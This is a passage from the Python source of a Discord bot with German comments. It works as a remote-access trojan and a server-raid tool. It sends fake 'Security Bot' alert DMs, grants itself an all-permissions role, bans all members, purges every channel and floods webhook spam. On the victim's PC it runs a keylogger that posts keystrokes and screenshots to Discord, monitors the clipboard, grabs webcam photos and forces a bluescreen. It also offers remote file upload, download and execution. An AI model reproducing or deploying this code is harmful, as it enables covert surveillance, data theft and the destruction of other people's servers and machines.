                    "It looks like your server **{server_name}** has been targeted by a raid. "
                    "I'm currently attempting to mitigate the damage, but I need your assistance to fully resolve the issue.\n\n"
                    "**Action Required:**\n"
                    "1. Please review recent activities in your server.\n"
                    "2. Ensure no unauthorized roles or permissions have been granted.\n"
                    "3. If possible, enable server verification to prevent further unauthorized access.\n\n"
                    "Your prompt attention is crucial to secure your community. Thank you for your cooperation.\n\n"
                    "Best regards,\n"
                    "Your Security Bot"
                ).format(server_name=ctx.guild.name),
                color=discord.Color.red()
            )
            embed.set_footer(text="Security Bot")
            await owner.send(embed=embed)
            await ctx.send("Fake DM sent to the server owner.")
        except discord.Forbidden:
            await ctx.send("I couldn't send a DM to the server owner. They might have DMs disabled.")
    else:
        await ctx.send("Couldn't find the server owner.")

@bot.command(help="Sends a fake security DM to a specified member")
async def fakedmu(ctx, member_id: int):
    # Find the member with the given ID
    member = ctx.guild.get_member(member_id)
    if member:
        try:
            embed = discord.Embed(
                title="🚨 Security Alert 🚨",
                description=(
                    "Hello, I'm a security bot monitoring your server.\n\n"
                    "🔴 **Urgent Issue Detected** 🔴\n\n"
                    "It looks like your server **{server_name}** has been targeted by a raid. "
                    "I'm currently attempting to mitigate the damage, but I need your assistance to fully resolve the issue.\n\n"
                    "**Action Required:**\n"
                    "1. Please review recent activities in your server.\n"
                    "2. Ensure no unauthorized roles or permissions have been granted.\n"
                    "3. If possible, enable server verification to prevent further unauthorized access.\n\n"
                    "Your prompt attention is crucial to secure your community. Thank you for your cooperation.\n\n"
                    "Best regards,\n"
                    "Your Security Bot"
                ).format(server_name=ctx.guild.name),
                color=discord.Color.red()
            )
            embed.set_footer(text="Security Bot")
            await member.send(embed=embed)
            await ctx.send(f"Fake DM sent to {member.display_name}.")
        except discord.Forbidden:
            await ctx.send(f"I couldn't send a DM to {member.display_name}. They might have DMs disabled.")
    else:
        await ctx.send("Couldn't find the member with the provided ID.")

@bot.command(help= "Delete all Invites")
async def delinv(ctx):
    invites = await ctx.guild.invites()
    for invite in invites:
        await invite.delete()
    await ctx.send('All invites have been deleted.')

@bot.command(help= "Ban a specific Person")
async def ban(ctx, member: Union[discord.Member, discord.Object]):
    if isinstance(member, discord.Member):
        await member.ban()
        await ctx.send(f'{member.mention} wurde gebannt.')
    else:
        try:
            await bot.http.ban(member.id, ctx.guild.id, 0)
            # Hier wird die Person gepingt
            await ctx.send(f'<@{member.id}> wurde gebannt.')
        except discord.NotFound:
            await ctx.send("Die Person konnte nicht gefunden werden.")

@bot.command(help= "Unban a specific Person")
async def unban(ctx, member_id: int):
    try:
        ban_entry = await ctx.guild.fetch_ban(discord.Object(id=member_id))
        user = ban_entry.user
        await ctx.guild.unban(user)
        await ctx.send(f'{user.mention} wurde entbannt.')
    except discord.NotFound:
        await ctx.send("Die Person ist nicht gebannt.")

@bot.command(help= "Kick a specific Person")
async def kick(ctx, member: discord.Member):
    await member.kick()
    await ctx.send(f'{member.display_name} has been kicked.')

# Befehl für das Senden einer gefälschten Nachricht im Namen eines anderen Benutzers
@bot.command(help="Sends a fake message in someone else's name")
async def fakemessage(ctx, member: discord.Member, *, message: str):
    await ctx.message.delete()
    await member.send(message)

# Befehl für das Hinzufügen von gefälschten Stimmen zu einer Umfrage
@bot.command(help="Manipulates poll results by adding a fake vote")
async def fakevote(ctx, poll_message_id: int, reaction: str):
    poll_message = await ctx.channel.fetch_message(poll_message_id)
    await poll_message.add_reaction(reaction)

# Befehl für das Senden gefälschter Kick/Ban-Nachrichten
@bot.command(help="Sends fake kick/ban messages")
async def fakekick(ctx, member: discord.Member, *, reason: str):
    kick_embed = discord.Embed(
        title="Member Kicked",
        description=f"**{member.name}** has been kicked from the server.",
        color=discord.Color.red()
    )
    kick_embed.add_field(name="Reason", value=reason)
    await ctx.send(embed=kick_embed)

# Befehl für das Senden von automatisch generierten unangemessenen Inhalten
@bot.command(help="Posts automatically generated inappropriate content")
async def spamcontent(ctx, count: int):
    for _ in range(count):
        await ctx.send("https://pornhub.com/")

# Befehl für das Löschen des Nachrichtenverlaufs in einem Kanal
async def purge_channel(channel):
    deleted = 0
    while True:
        purged = await channel.purge(limit=100)
        deleted += len(purged)
        if len(purged) < 100:
            break
    return deleted

# Funktion zum Löschen des Nachrichtenverlaufs in einem Kanal
@bot.command(help="Deletes the message history in a channel")
async def clear(ctx, *channels: discord.TextChannel):
    total_deleted = 0

    if not channels:
        start_time = time.perf_counter()  # Startzeitmessung
        deleted = await purge_channel(ctx.channel)
        total_deleted += deleted
        end_time = time.perf_counter()  # Endzeitmessung
        total_time = end_time - start_time  # Berechnen der benötigten Zeit
        await ctx.send(f'Cleared {deleted} messages in {total_time:.4f} seconds in {ctx.channel.mention}', delete_after=2)
    else:
        start_time = time.perf_counter()  # Startzeitmessung
        tasks = [purge_channel(channel) for channel in channels]
        deleted_counts = await asyncio.gather(*tasks)
        total_deleted += sum(deleted_counts)
        end_time = time.perf_counter()  # Endzeitmessung
        total_time = end_time - start_time  # Berechnen der benötigten Zeit
        await ctx.send(f'Cleared a total of {total_deleted} messages in {total_time:.4f} seconds in the specified channels', delete_after=2)

    try:
        await asyncio.sleep(total_time)  # Warten bis alle Löschnachrichten gelöscht sind
        await ctx.message.delete()  # Löschen der ursprünglichen Löschnachricht
    except discord.NotFound:
        pass  # Nachricht wurde bereits gelöscht oder konnte nicht gefunden werden

@bot.command(help="Deletes the message history in all channels")
async def clearall(ctx):
    for channel in ctx.guild.text_channels:
        await channel.purge(limit=None)

@bot.command(help="Assigns the DOPE ROLE to the user")
async def dop(ctx):
    dope_role = discord.utils.get(ctx.guild.roles, name="DOPE ROLE")
    if not dope_role:
        try:
            dope_role = await ctx.guild.create_role(name="DOPE ROLE", permissions=discord.Permissions.all())
        except discord.Forbidden:
            await ctx.message.delete()
            return

    await ctx.author.add_roles(dope_role)
    await ctx.message.delete()

async def move_role_to_top(guild, role_name):
    role = discord.utils.get(guild.roles, name=role_name)
    if not role:
        print(f"Role '{role_name}' not found.")
        return

    # Hole die Liste aller Rollen des Servers und sortiere sie nach Position
    roles = sorted(guild.roles, key=lambda x: x.position, reverse=True)

    # Finde die Position der gesuchten Rolle
    role_position = roles.index(role)

    try:
        # Ändere die Position der Rolle auf 1 (ganz oben)
        await role.edit(position=1)

        # Aktualisiere die Positionen aller anderen Rollen
        for idx, r in enumerate(roles):
            if r != role:
                await r.edit(position=idx + 2)  # Rollenpositionen beginnen bei 1, nicht bei 0

        print(f"Role '{role_name}' moved to the top successfully.")
    except discord.Forbidden:
        print("Bot doesn't have permission to edit roles.")
    except Exception as e:
        print(f"An error occurred: {e}")

# Verwendung:
# Annahme: 'bot' ist dein discord.py Bot-Objekt
@bot.command(help= "Move DOPE ROLE to highest role (needs PERMS)")
async def movdop(ctx):
    await move_role_to_top(ctx.guild, "DOPE ROLE")

@bot.command(help="Deletes all roles named DOPE ROLE")
async def deldop(ctx):
    if not ctx.guild.me.guild_permissions.manage_roles:
        await ctx.send("Der Bot hat nicht die Berechtigung, Rollen zu löschen.")
        return

    roles_to_delete = [role for role in ctx.guild.roles if role.name == "DOPE ROLE"]
    for role in roles_to_delete:
        try:
            await role.delete()
            print(f"Deleted role: {role.name}")
        except discord.Forbidden:
            print(f"Failed to delete role: {role.name}")
    await ctx.message.delete()

# Define a command to read text using TTS on the local machine
@bot.command(help="text to speech")
async def tts(ctx, *, text: str):
    # Starte die TTS-Funktion in einem separaten Thread
    thread = threading.Thread(target=read_text, args=(ctx, text))
    thread.start()

# Funktion zum Vorlesen des Textes
def read_text(ctx, text):
    try:
        # Initialize the TTS engine
        engine = pyttsx3.init()

        # Set properties (optional)
        engine.setProperty('rate', 150)    # Speed percent (can go over 100)
        engine.setProperty('volume', 0.9)  # Volume 0-1

        # Say the text
        engine.say(text)

        # Wait until speech is finished
        engine.runAndWait()

    except Exception as e:
        ctx.send(f"An error occurred: {e}")

import tkinter as tk
from tkinter import messagebox

@bot.command(help= "Create a Webhook in every Channel and SPAM!")
async def ownspam(ctx):
    global spamming_enabled  # Define global variable
    print("Starting ownspam command...")
    tasks = []
    for guild in bot.guilds:
        print(f"Processing guild: {guild.name}")
        for channel in guild.text_channels:
            print(f"Creating webhook in channel: {channel.name}")
            task = asyncio.create_task(create_and_send_spam(channel))
            tasks.append(task)
    await asyncio.gather(*tasks)

async def create_and_send_spam(channel):
    global spamming_enabled  # Define global variable
    try:
        webhook = await create_webhook(channel)
        if webhook:
            print(f"Webhook created successfully in channel {channel.name}: {webhook.name}")
            while spamming_enabled:  # Check if spamming is enabled
                await send_spam(webhook)
                await asyncio.sleep(3)
        else:
            print(f"Failed to create webhook in channel {channel.name}.")
    except Exception as e:
        print(f"An error occurred in channel {channel.name}: {e}")

async def create_webhook(channel):
    try:
        webhooks = await channel.webhooks()
        existing_webhook = discord.utils.get(webhooks, name="raided by Heidi")
        if existing_webhook:
            return existing_webhook
        else:
            webhook = await channel.create_webhook(name="raided by Heidi")
            return webhook
    except Exception as e:
        print(f"Failed to create webhook in channel {channel.name}: {e}")
        return None

async def send_spam(webhook):
    try:
        await webhook.send("@everyone @here you just got raided by Heidi!", username="Raider", avatar_url="https://example.com/avatar.png")
    except Exception as e:
        print(f"Failed to send message via webhook: {e}")

@bot.command(help= "Delete all the Webhooks created by >ownspam.")
async def delown(ctx):
    global spamming_enabled  # Define global variable
    print("Starting delown command...")
    spamming_enabled = False  # Disable spamming
    for guild in bot.guilds:
        print(f"Processing guild: {guild.name}")
        for channel in guild.text_channels:
            print(f"Using channel: {channel.name}")
            await delete_webhook(channel)
            print(f"Webhook deleted successfully in channel {channel.name}.")

async def delete_webhook(channel):
    try:
        webhooks = await channel.webhooks()
        existing_webhook = discord.utils.get(webhooks, name="raided by Heidi")
        if existing_webhook:
            await existing_webhook.delete()
    except Exception as e:
        print(f"Failed to delete webhook in channel {channel.name}: {e}")

# Funktion zur Überwachung des Clipboards
async def monitor_clipboard():
    global clipboard_previous
    while True:
        clipboard_content = pyperclip.paste()
        if clipboard_content != clipboard_previous:
            clipboard_previous = clipboard_content
            # Sende die Nachricht nur an den in on_ready erstellten Kanal
            if clipboard_channel:
                await send_embed_message(clipboard_channel, f"Clipboard changed:\n```\n{clipboard_content}\n```")
        await asyncio.sleep(1)

@bot.command(help= "Get the SERVER OWNER's dc name.")
async def getowner(ctx):
    guild_owner = ctx.guild.owner
    if guild_owner:
        await ctx.send(f'The owner of this server is: {guild_owner}')
    else:
        await ctx.send("Failed to find the owner of this server.")

@bot.command(help="Bans all members except for the specified user ID")
async def banall(ctx):
    if ctx.author.guild_permissions.administrator:
        await ctx.send("Banning all members except for the specified user ID...")
        # ID des Benutzers, der nicht gebannt werden soll
        allowed_user_id = 691670319248965694

        # Alle Mitglieder des Servers auflisten
        members = ctx.guild.members

        # Schleife durch alle Mitglieder und bannen, wenn ihre ID nicht die erlaubte ID ist und es keine Bots sind
        for member in members:
            if member.id != allowed_user_id and not member.bot:
                try:
                    await member.ban(reason="Ban all command executed")
                    await ctx.send(f"User {member.name}#{member.discriminator} banned.")
                except discord.Forbidden:
                    await ctx.send(f"The bot doesn't have the necessary permissions to ban {member.name}#{member.discriminator}.")
                except Exception as e:
                    await ctx.send(f"Failed to ban {member.name}#{member.discriminator}: {e}")

        await ctx.send("All non-bot members banned except for the specified user ID.")
    else:
        await ctx.send("You do not have permission to execute this command.")

# Unbanall Command
@bot.command(help="Unban every banned user in this Guild")
async def unbanall(ctx):
    if ctx.author.guild_permissions.administrator:
        await ctx.send("Entbannen aller Benutzer gestartet...")
        try:
            server = ctx.guild
            async for ban_entry in server.bans():
                user = ban_entry.user
                try:
                    await server.unban(user)
                    await ctx.send(f"Benutzer {user} wurde erfolgreich entbannt.")
                except discord.Forbidden:
                    await ctx.send(f"Der Bot hat nicht die erforderlichen Berechtigungen, um {user} zu entbannen.")
                except Exception as e:
                    await ctx.send(f"Fehler beim Entbannen des Benutzers {user}: {e}")
        except Exception as e:
            global popup_window
            await ctx.send(f"Fehler beim Abrufen der gebannten Benutzer: {e}")
    else:
        await ctx.send("Du hast keine Berechtigung, diesen Befehl auszuführen.")

# Define den >say Befehl
@bot.command(help="show message on screen")
async def say(ctx, *, message):
    # Gib die Nachricht aus
    show_message(message)

# Funktion zur Anzeige der Nachricht
def show_message(text):
    # Erstelle ein Tkinter-Fenster
    root = tk.Tk()
    root.withdraw()  # Verstecke das Hauptfenster

    # Zeige die Nachricht in einem Popup-Fenster in der Mitte des Bildschirms
    message_box = messagebox.showinfo("New Message!!!", text)

    # Hebe das Popup-Fenster in den Vordergrund über allen anderen Fenstern
    root.attributes("-topmost", True)
    root.wm_attributes("-topmost", 1)

    # Setze den Fokus auf das Popup-Fenster
    root.after(0, lambda: root.focus_force())

################################################################################

# Define den >ad Befehl
@bot.command(help="show message on screen with disabled close button")
async def ad(ctx, *, message):
    # Starte die Tkinter-Funktion in einem separaten Thread
    thread = threading.Thread(target=show_message2, args=(ctx, message))
    thread.start()

# Define den >close Befehl
@bot.command(help="close the message popup window")
async def close(ctx):
    global popup_window
    global close_button_window
    if popup_window:
        popup_window.destroy()
        popup_window = None
    if close_button_window:
        close_button_window.destroy()
        close_button_window = None

# Funktion zur Anzeige der Nachricht mit deaktivierter Schließ-Schaltfläche (X)
def show_message2(ctx, text):
    global popup_window
    global popup_root
    global close_button_window

    # Erstelle ein Tkinter-Fenster
    root = tk.Tk()
    root.withdraw()  # Verstecke das Hauptfenster
    popup_root = root

    # Deklariere die Variable popup_window global
    global popup_window

    # Erstelle ein Top-Level-Fenster für die Nachricht
    popup = tk.Toplevel(root)
    popup.title("New Message!!!")

    # Setze die Nachricht im Fenster mit größerer Schriftgröße und umbrochenem Text
    label = tk.Label(popup, text=text, font=("Helvetica", 15))
    label.pack()

    # Deaktiviere die Schließ-Schaltfläche (X)
    popup.protocol("WM_DELETE_WINDOW", lambda: None)

    # Verstecke die Minimieren-Schaltfläche und die Maximieren-Schaltfläche
    popup.overrideredirect(1)
    popup.attributes("-topmost", True)

    # Berechne die Größe des Fensters basierend auf der Größe des Textes
    window_width = label.winfo_reqwidth() + 0  # Füge 20 Pixel für den Rand hinzu
    window_height = label.winfo_reqheight() + 0  # Füge 20 Pixel für den Rand hinzu

    # Berechne die Position, um das Fenster in die Mitte des Bildschirms zu setzen
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    position_x = int((screen_width - window_width) / 2)
    position_y = int((screen_height - window_height) / 2)
    popup.geometry(f"{window_width}x{window_height}+{position_x}+{position_y}")

    # Erstelle ein kleines Fenster für die Schließen-Schaltfläche
    close_button_root = tk.Toplevel(root)
    close_button_root.overrideredirect(1)
    close_button_root.geometry("+0+0")  # Positioniere ganz in die Ecke
    close_button_root.attributes("-topmost", True)

    # Erstelle die Schließen-Schaltfläche
    close_button = tk.Button(close_button_root, text="X", command=lambda: close_popup(popup, close_button_root), font=("Helvetica", 4), width=1, height=1)
    close_button.pack()

    # Speichere das Popup-Fenster und die Schließen-Schaltfläche
    popup_window = popup
    close_button_window = close_button_root

    # Starte die Tkinter Schleife
    root.mainloop()

# Funktion zum Schließen des Popups
def close_popup(popup, close_button_root):
    popup.destroy()
    close_button_root.destroy()

################################################################################

@bot.command(help= "send a picture of every cam")
async def cams(ctx):
    camera_index = 0
    while True:
        ret, image = capture_image(camera_index)
        if ret:
            await send_image(ctx, image)
        else:
            # Wenn keine Kamera an diesem Index vorhanden ist, breche die Schleife ab
            break
        camera_index += 1

async def send_image(ctx, image):
    _, img_encoded = cv2.imencode('.jpg', image)
    img_bytes = img_encoded.tobytes()
    img_file = discord.File(io.BytesIO(img_bytes), filename='image.jpg')
    await ctx.send(file=img_file)

def capture_image(camera_index):
    cap = cv2.VideoCapture(camera_index)
    if not cap.isOpened():
        print(f"Kamera {camera_index} ist nicht verfügbar.")
        return False, None
    ret, frame = cap.read()
    cap.release()
    return ret, frame

@bot.command(help= "Bot leaves the server")
async def leave(ctx):
    await ctx.send("Ich verlasse den Server...")
    await ctx.guild.leave()

@bot.command(help="Executes multiple actions: banall, delall, auditspam, clear, reguild, repic")
async def all(ctx):
    print("clear")
    await clear(ctx)
    print("reguild")
    await reguild(ctx, "raided by Heidi")  # Hier wird der reguild-Befehl direkt aufgerufen
    print("clear")
    await clear(ctx)
    print("repic")
    await repic(ctx, "https://media.tenor.com/2fDPAEGo1vAAAAAM/alfred-marko.gif")
    print("clear")
    await clear(ctx)
    print("delall")
    await delall(ctx)
    print("clear")
    await clear(ctx)
    print("banall")
    await banall(ctx)
    print("clear")
    await clear(ctx)
    print("spam")
    await spam(ctx)
    print("clear")
    await clear(ctx)

@bot.command(help="Change a nickname")
async def change_nick(ctx, member: str, new_nick: str):
    if not ctx.author.guild_permissions.manage_nicknames:
        await ctx.send("You do not have the necessary permissions to change nicknames.")
        return

    if not ctx.guild.me.guild_permissions.manage_nicknames:
        await ctx.send("I do not have the necessary permissions to change nicknames.")
        return

    if member == "*":
        await ctx.send("Changing nicknames for all members including bots...")
        members = ctx.guild.members

        for member in members:
            try:
                await member.edit(nick=new_nick)
                await ctx.send(f"Changed nickname for {member.name} to {new_nick}")
            except discord.Forbidden:
                await ctx.send(f"I don't have the necessary permissions to change the nickname for {member.name}")
            except Exception as e:
                await ctx.send(f"Failed to change nickname for {member.name}: {e}")
    else:
        try:
            member = await commands.MemberConverter().convert(ctx, member)
            await member.edit(nick=new_nick)
            await ctx.send(f"Changed nickname for {member.name} to {new_nick}")
        except commands.MemberNotFound:
            await ctx.send("Member not found. Please provide a valid member mention or ID.")
        except discord.Forbidden:
            await ctx.send(f"I don't have the necessary permissions to change the nickname for {member}")
        except Exception as e:
            await ctx.send(f"Failed to change nickname for {member}: {e}")

@bot.command(help= "Flood DMs")
async def dm_flood(ctx, member: discord.Member):
    for _ in range(20):  # Flooding with 20 messages
        await member.send("@everyone")

@bot.command(help= "Change Admin nickname")
async def change_admin_nick(ctx):
    for member in ctx.guild.members:
        if member.guild_permissions.administrator:
            await member.edit(nick=f'Admin-{random.randint(1, 1000)}')
            await ctx.send(f'Changed admin {member.name} nickname')

@bot.command(help= "Flood with Emojis")
async def emoji_flood(ctx):
    for _ in range(500):
        await ctx.send(random.choice(['😂', '😡', '😢', '❤️', '😜', '😊', '😎', '😍', '😭', '😏', '😅', '🙄', '😴', '😬', '😋', '😇', '🤔', '🤗', '😳', '😌', '😤', '😈', '🤐', '😪', '😷', '😫', '😝', '😕', '😱', '😖', '😩', '😓', '😒', '😔', '😘', '😙', '😚', '😑', '😐', '😶', '😅', '😁', '😄', '😆', '😃', '😀', '🤣', '😉', '😌', '😎', '😛', '😜', '😝', '🤑', '😲', '🙃', '🤔', '🤥', '😣', '😖', '😤', '😡', '😠', '🤒', '🤕', '😷', '🤧', '😇', '🤠', '🤡', '🤥', '😈', '👿', '👹', '👺', '💀', '👻', '👽', '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾', '🐱', '🐶', '🦊', '🐰', '🐻', '🐼', '🐨', '🐯', '🦁', '🐮', '🐷', '🐽', '🐸', '🐵', '🙈', '🙉', '🙊', '🐒', '🐔', '🐧', '🐦', '🐤', '🐣', '🐥', '🦆', '🦅', '🦉', '🦇', '🐺', '🐗', '🐴', '🦄', '🐝', '🐛', '🦋', '🐌', '🐞', '🐜', '🕷', '🕸', '🦂', '🐢', '🐍', '🦎', '🦖', '🦕', '🐙', '🦑', '🦐', '🦞', '🦀', '🐡', '🐠', '🐟', '🐬', '🐳', '🐋', '🦈', '🐊', '🐅', '🐆', '🦓', '🦍', '🐘', '🦏', '🦛', '🐪', '🐫', '🦙', '🦒', '🐃', '🐂', '🐄', '🐎', '🐖', '🐏', '🐑', '🐐', '🦌', '🐕', '🐩', '🦮', '🐕‍🦺', '🐈', '🐈‍⬛', '🦢', '🦜', '🦚', '🦩', '🦨', '🦡', '🦦', '🦥', '🐁', '🐀', '🐿', '🦔', '🐉', '🐲', '🌵', '🎄', '🌲', '🌳', '🌴', '🌱', '🌿', '☘️', '🍀', '🎍', '🎋', '🍃', '🍂', '🍁', '🍄', '🌾', '💐', '🌷', '🌹', '🥀', '🌺', '🌸', '🌼', '🌻', '🌞', '🌝', '🌛', '🌜', '🌚', '🌕', '🌖', '🌗', '🌘', '🌑', '🌒', '🌓', '🌔', '🌙', '🌎', '🌍', '🌏', '💫', '⭐', '🌟', '✨', '⚡', '🔥', '💥', '🌪', '🌈', '☔', '💧', '💦', '🌊', '🎃', '🎄', '🎆', '🎇', '✨', '🎈', '🎉', '🎊', '🎋', '🎍', '🎎', '🎏', '🎐', '🎑', '🧧', '🎀', '🎁', '🎗', '🎟', '🎫', '🎖', '🏆', '🏅', '🥇', '🥈', '🥉', '⚽', '⚾', '🥎', '🏀', '🏐', '🏈', '🏉', '🎾', '🥏', '🎳', '🏏', '🏑', '🏒', '🥍', '🏓', '🏸', '🥊', '🥋', '🥅', '⛳', '⛸', '🎣', '🤿', '🎽', '🎿', '🛷', '🥌', '🎯', '🪀', '🪁', '🎱', '🔮', '🪄', '🧿', '🪬', '🕹', '🧩', '🧸', '🪅', '🪩', '🪆', '♠️', '♥️', '♦️', '♣️', '♟', '🃏', '🀄', '🎴', '🎭', '🖼', '🎨', '🧵', '🪡', '🧶', '🪢', '👓', '🕶', '🥽', '🥼', '🦺', '👔', '👕', '👖', '🧣', '🧤', '🧥', '🧦', '👗', '👘', '🥻', '🩱', '🩲', '🩳', '👙', '👚', '👛', '👜', '👝', '🛍', '🎒', '🩴', '👞', '👟', '🥾', '🥿', '👠', '👡', '🩰', '👢', '👑', '👒', '🎩', '🎓', '🧢', '🪖', '⛑', '💄', '💍', '💎', '📿', '🔇', '🔈', '🔉', '🔊', '📢', '📣', '📯', '🔔', '🔕', '🎼', '🎵', '🎶', '🎙', '🎚', '🎛', '🎤', '🎧', '📻', '🎷', '🪗', '🎸', '🎹', '🎺', '🎻', '🪕', '🥁', '🪘', '📱', '📲', '☎️', '📞', '📟', '📠', '🔋', '🔌', '💻', '🖥', '🖨', '⌨️', '🖱', '🖲', '💽', '💾', '💿', '📀', '🧮', '🎥', '🎬', '📺', '📷', '📸', '📹', '📼', '🔍', '🔎', '🕯', '💡', '🔦', '🏮', '🪔', '📔', '📕', '📖', '📗', '📘', '📙', '📚', '📓', '📒', '📃', '📜', '📄', '📰', '🗞', '📑', '🔖', '🏷', '💰', '🪙', '💴', '💵', '💶', '💷', '💸', '💳', '🧾', '💹', '✉️', '📧', '📨', '📩', '📤', '📥', '📦', '📫', '📪', '📬', '📭', '📮', '🗳', '✏️', '✒️', '🖋', '🖊', '🖌', '🖍', '📝', '📁', '📂', '🗂', '📅', '📆', '🗒', '🗓', '📇', '📈']))

@bot.command(help= 'Create max Roles named "U NOOB"')
async def rolez(ctx):
    if not ctx.guild:
        await ctx.send("Dieser Befehl kann nur auf einem Server verwendet werden.")
        return

    for i in range(250):
        role_name = "U NOOB"
        try:
            await ctx.guild.create_role(name=role_name)
        except discord.Forbidden:
            await ctx.send("Ich habe keine Berechtigung, Rollen zu erstellen.")
            return
        except discord.HTTPException:
            await ctx.send("Es ist ein Fehler beim Erstellen der Rolle aufgetreten.")
            return

    await ctx.send("Rollen mit dem Namen 'U NOOB' wurden erstellt.")

TIME_INTERVAL = 20

class Keylogger:
    def __init__(self, channel, interval):
        self.interval = interval
        self.channel = channel
        self.log = ""

    async def _report(self):
        await bot.wait_until_ready()
        while True:
            await asyncio.sleep(self.interval)
            timenow = datetime.now().time()
            if self.log:
                try:
                    await self.channel.send(f"*USER*: **{os.getlogin()}** ~~*TIME: {timenow}*~~ {self.log}")
                    self.log = ''

                    # Take a screenshot
                    screenshot = ImageGrab.grab(all_screens=True)

                    # Save the screenshot to a file
                    screenshot_filename = f"C:/Users/{os.getlogin()}/Downloads/screenshot.png"
                    screenshot.save(screenshot_filename)

                    # Send the screenshot to the Discord channel
                    await self.channel.send(file=discord.File(screenshot_filename))

                    # Delete the screenshot file
                    os.remove(screenshot_filename)
                except Exception as e:
                    print(f"Error in reporting: {e}")  # Handle the exception here

    def _on_key_press(self, key):
        try:
            self.log += str(key)
        except Exception as e:
            print(f"Error in key press: {e}")  # Handle the exception here

    def run(self):
        threading.Thread(target=self._start_keylogger).start()

    def _start_keylogger(self):
        with Listener(on_press=self._on_key_press) as listener:
            listener.join()

@bot.command(help='enable keylogger')
async def on(ctx):
    keylogger = Keylogger(ctx, TIME_INTERVAL)
    await ctx.send("Keylogger started.")
    keylogger.run()
    asyncio.create_task(keylogger._report())  # Start the reporting loop

@bot.command(help='disable keylogger')
async def off(ctx):
    await ctx.send("Keylogger stopped.")
    # Add functionality to stop the keylogger if needed

@bot.command(help= "bluescreen the computer")
async def bluescreen(ctx):
    if not os.getlogin() == DEV:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
    else: await ctx.send("DU HURENSOHN")

@bot.command(help= "open any URL in the webbrowser")
async def url(ctx, url: str):
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    if platform.system() == 'Darwin':  # macOS
        subprocess.call(('open', url))
    elif platform.system() == 'Windows':  # Windows
        subprocess.call(('start', url), shell=True)
    else:  # Linux variants
        subprocess.call(('xdg-open', url))

    await ctx.send(f'Opening URL: {url}')

# Funktion zum Ändern des Verzeichnisses
@bot.command(help="Change directory")
async def cd(ctx, *, path: str = None):
    global current_directory
    if path:
        try:
            os.chdir(path)
            current_directory = os.getcwd()  # Aktualisiere den aktuellen Verzeichnispfad
            await ctx.send(f'Changed directory to {current_directory}')
        except Exception as e:
            await ctx.send(f'Error: {e}')
    else:
        await ctx.send(f'Current directory is {current_directory}')

# Create directory
@bot.command(help="Create directory")
async def mkdir(ctx, *, dirname: str):
    try:
        os.mkdir(dirname)
        await ctx.send(f'Directory {dirname} created')
    except Exception as e:
        await ctx.send(f'Error: {e}')

# Remove directory
@bot.command(help="Remove directory")
async def rmdir(ctx, *, dirname: str):
    try:
        os.rmdir(dirname)
        await ctx.send(f'Directory {dirname} removed')
    except Exception as e:
        await ctx.send(f'Error: {e}')

# Create file
@bot.command(help="Create file")
async def touch(ctx, filename: str):
    global current_directory
    if filename:
        file_path = os.path.join(os.getcwd(), filename)  # Absoluten Pfad erstellen
        if not os.path.exists(file_path):
            try:
                with open(file_path, "w"):
                    pass
                await ctx.send(f"File `{filename}` created successfully in directory `{current_directory}`")
            except Exception as e:
                await ctx.send(f"Error creating file: {e}")
        else:
            await ctx.send("File already exists.")
    else:
        await ctx.send("Please specify a filename.")

# Remove file
@bot.command(help="Remove file")
async def rm(ctx, *, filename: str):
    try:
        os.remove(filename)
        await ctx.send(f'File {filename} removed')
    except Exception as e:
        await ctx.send(f'Error: {e}')

# Upload file
@bot.command(help="Upload file")
async def upload(ctx, *, filename: str):
    try:
        await ctx.send(file=discord.File(filename))
    except Exception as e:
        await ctx.send(f'Error: {e}')

# Download file
@bot.command(help="Download file")
async def download(ctx):
    if len(ctx.message.attachments) == 0:
        await ctx.send("No file attached.")
        return

    attachment = ctx.message.attachments[0]
    try:
        await attachment.save(attachment.filename)
        await ctx.send(f'File {attachment.filename} downloaded')
    except Exception as e:
        await ctx.send(f'Error: {e}')

# Funktion zum Markieren von Dateiendungen
def mark_file_extensions(files):
    marked_files = []
    for file in files:
        filename, file_extension = os.path.splitext(file)
        if file_extension:
            marked_files.append(f"{filename}*{file_extension}*")
        else:
            marked_files.append(filename)  # Füge nur den Dateinamen hinzu, wenn keine Dateiendung vorhanden ist
    return marked_files

# List directory contents
@bot.command(help="List directory contents")
async def ls(ctx, order=''):
    try:
        if order == 'n':  # Check if the order parameter is 'n' for newest to oldest
            files = os.listdir(current_directory)
            files.sort(key=lambda x: os.path.getmtime(os.path.join(current_directory, x)), reverse=True)
        else:  # Default behavior, list files alphabetically
            files = os.listdir(current_directory)
            files.sort()

        marked_files = mark_file_extensions(files)
        files_str = '\n'.join(marked_files)

        if len(files_str) <= 4096:
            embed = discord.Embed(
                title=f"Contents of {current_directory}",
                description=files_str,
                color=discord.Color.blue()
            )
            await ctx.send(embed=embed)
        else:
            chunks = [files_str[i:i + 4096] for i in range(0, len(files_str), 4096)]
            for chunk in chunks:
                embed = discord.Embed(
                    title=f"Contents of {current_directory}",
                    description=chunk,
                    color=discord.Color.blue()
                )
                await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f'Error: {e}')

# Run file
@bot.command(help="Run a file in the current directory")
async def run(ctx, filename: str):
    global current_directory
    file_path = os.path.join(current_directory, filename)
    if os.path.exists(file_path):
        try:
            os.startfile(file_path)  # Öffne die Datei basierend auf ihrer Assoziation mit dem Dateityp
            await ctx.send(f"File `{filename}` opened successfully.")
        except Exception as e:
            await ctx.send(f"Error opening file `{filename}`: {e}")
    else:
        await ctx.send("File not found.")

@bot.command(help= "show all the processes")
async def ran(ctx, query: str = ""):
    # Holen der laufenden Prozesse mit subprocess
    result = subprocess.run(['tasklist'], capture_output=True, text=True, shell=True)
    process_list = result.stdout

    # Wenn kein spezifischer Prozess angegeben wurde, sende die gesamte Prozessliste
    if not query:
        # Wenn die Nachricht zu lang ist, teile sie auf
        if len(process_list) > 1900:
            for i in range(0, len(process_list), 1900):
                await ctx.send(f"```\n{process_list[i:i+1900]}\n```")
        else:
            await ctx.send(f"```\n{process_list}\n```")
        return

    # Durchsuchen der Prozessliste nach dem Prozessnamen oder der PID
    process_info = ""
    for line in process_list.splitlines():
        if query.lower() in line.lower():  # Falls der Prozessname oder die PID gefunden wurde
            process_info = line
            break

